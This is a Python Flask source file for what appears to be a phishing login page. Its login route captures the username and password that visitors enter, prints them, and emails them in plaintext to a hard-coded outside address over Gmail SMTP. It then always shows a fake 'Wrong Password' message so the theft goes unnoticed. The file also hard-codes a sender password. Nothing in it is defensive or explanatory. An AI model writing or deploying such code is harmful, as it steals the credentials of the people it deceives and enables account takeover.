from flask import Flask, render_template, request
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

def send_email(username, password):
    # Email configuration
    sender_email = 'sender@gmail.com'  # Replace with your email address
    sender_password = '123'  # Replace with your email password
    recipient_email = 'pavansh555@gmail.com'  # Replace with recipient email address

    # Create message
    subject = 'Login Attempt'
    message = f'Username: {username}\nPassword: {password}'
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    # Connect to Gmail SMTP server and send email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['name']
        password = request.form['pass']
        print("Username:", username)
        print("Password:", password)
        
        # Send email with login attempt details
        send_email(username, password)
        
        # Here you can process the username and password, e.g., authenticate user
        
        # For demonstration purposes, let's just return a success message
        return "Wrong Password. Try again from the link"
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
